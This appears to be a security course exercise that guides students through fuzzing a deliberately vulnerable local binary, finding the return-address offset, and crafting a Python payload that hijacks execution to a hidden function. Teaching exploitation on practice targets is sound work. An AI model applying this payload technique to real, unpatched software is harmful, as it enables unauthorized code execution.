# Exercise 2: Black-Box Fuzzing

You have a compiled binary called `victim`. You can run it, but pretend you
**cannot read the source code**. Your mission: hijack the program's execution
without knowing the password and without reading `victim.c`.

## Setup

Compile the victim (then close `victim.c` — no peeking):

```bash
gcc -fno-stack-protector -no-pie -o victim victim.c
```

> On macOS, `-no-pie` and `-z execstack` may not be supported or needed.
> The exercise works without them — the key behavior (return address overwrite)
> still happens. If you get warnings, just use:
> ```bash
> gcc -fno-stack-protector -o victim victim.c
> ```

## Step 1: Observe Normal Behavior

```bash
echo "hello" | ./victim
echo "opensesame" | ./victim
```

It accepts input and says "Access granted" or "Access denied." That's all you know.

## Step 2: Find the Crash Point (Fuzzing)

Send increasingly long inputs and see when it breaks:

```bash
python3 -c "print('A' * 50)"  | ./victim
python3 -c "print('A' * 100)" | ./victim
python3 -c "print('A' * 80)"  | ./victim
python3 -c "print('A' * 72)"  | ./victim
```

At some point, you'll get a **segfault** (or "Abort trap" on macOS).
Binary-search until you find the smallest input that crashes.

**What's happening:** You're writing past the buffer, past the saved frame
pointer, and corrupting the return address. The CPU tries to jump to
`0x4141414141414141` ("AAAA...") which is not a valid address → crash.

## Step 3: Confirm with objdump (optional)

Fuzzing found the crash point. Now let's see if the binary's disassembly
agrees. This step is about learning to read a binary, not about finding
the offset (you already have it).

```bash
objdump -d ./victim | grep -A 20 "check_input"
```

Look for `sub sp, sp, #NN` (ARM64/Apple Silicon) or `sub $0xNN,%rsp` (x86).
That `NN` is the **total stack frame size** — all local variables plus
alignment padding the compiler added.

**Important:** The total frame size ≠ the overflow offset. The frame might
be 96 bytes, but the crash happens at 72. Why?

```
  ┌────────────────────────┐
  │  return address         │ ← crash point: 72 bytes from buffer start
  ├────────────────────────┤
  │  saved frame ptr (8B)   │
  ├────────────────────────┤
  │  buffer[64]             │ ← your input starts here
  ├────────────────────────┤
  │  padding / other (24B)  │ ← compiler added this; your input never touches it
  └────────────────────────┘
       96 bytes total frame
```

The compiler reserved 96 bytes total, but your buffer is only at one end.
The 24 extra bytes are below your buffer (for alignment, saved registers, etc.)
so your overflow goes upward and never passes through them.

**Takeaway:** `objdump` gives you the total room size. Fuzzing tells you
where your buffer actually sits within that room. Real attackers use both:
disassembly to get a ballpark, fuzzing to nail down the exact offset.

## Step 4: Find the Secret Function

```bash
# List all symbols — is there anything interesting?
objdump -t ./victim | grep -i secret

# Or just look at all function names
nm ./victim
```

You should find `secret_function` at a specific address (e.g., `0x00401146`).
This simulates the attacker having shellcode at a known address.

## Step 5: Hijack the Return Address

Now construct a payload that:
1. Fills the buffer (64 bytes)
2. Overwrites the saved frame pointer (8 bytes)
3. Writes the address of `secret_function` into the return address

```bash
# Get the address of secret_function (replace with YOUR address from step 4)
ADDR=$(nm ./victim | grep secret_function | awk '{print $1}')
echo "secret_function is at: 0x$ADDR"

# Build the payload:
# - 72 bytes of padding (64 buffer + 8 saved frame pointer)
# - then the address in little-endian byte order
python3 -c "
import struct
padding = b'A' * 72
# Replace this address with yours from nm output:
addr = 0x$(nm ./victim | grep secret_function | awk '{print $1}')
payload = padding + struct.pack('<Q', addr)
import sys
sys.stdout.buffer.write(payload)
" | ./victim
```

If it works, you'll see the "YOU HIJACKED THE RETURN ADDRESS" message —
a function that `main()` never called is now executing.

## What You Just Did

```
  What normal execution looks like:

  main() → check_input() → [return to main] → "Goodbye."

  What your overflow did:

  main() → check_input() → [return to SECRET_FUNCTION] → "HIJACKED!"
                                     ▲
                          you overwrote this address
```

Without knowing the source code, you:
1. **Fuzzed** to find the crash point
2. **Disassembled** to understand the exact offset
3. **Found a target** function in the symbol table
4. **Crafted a payload** that redirects execution

This is the essence of the Morris Worm's `fingerd` exploit — same technique,
different target function (it spawned a shell instead of printing a message).

## Reflection Questions

1. What if the binary had been **stripped** (`strip ./victim`) — removing all
   symbol names? Could you still find `secret_function`? How?

2. What if ASLR was enabled and the addresses changed every run?
   (Hint: this is why NOP sleds and address leaks matter.)

3. The `gets()` function has been removed from the C standard as of C11.
   Why did it take until 2011 to remove a function known to be dangerous
   since at least 1988?
